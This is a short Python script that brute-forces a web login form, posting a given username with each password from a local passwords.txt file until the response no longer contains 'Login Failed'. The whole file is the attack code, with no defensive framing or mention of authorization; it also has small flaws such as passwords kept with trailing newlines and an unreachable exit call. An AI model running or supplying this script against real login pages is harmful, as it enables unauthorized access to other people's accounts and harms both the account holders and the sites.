
import requests
from random import choice
import time

def bruteforce(url, username, password) :
    response = requests.post(url=url, data={
    "username": username,
    "password": password,
    "submit": "Login"
    })

    if "Login Failed" in response.text:
        print("[+] Bad Login")
        return False
    else :
        print("[+] Login OK !!!")
        return True




def bruteforce2(url,username):
    mes = ''
    with open('passwords.txt', 'r') as fp:

        for password in fp.readlines():
            
            print("[+] Trying password : {}".format(password))
            mes += "[+] Trying password : {}".format(password)
            print(">>>"+mes)
            if bruteforce(url, username, password):
                mes += ">>>> Login successful"
                return mes
                exit()


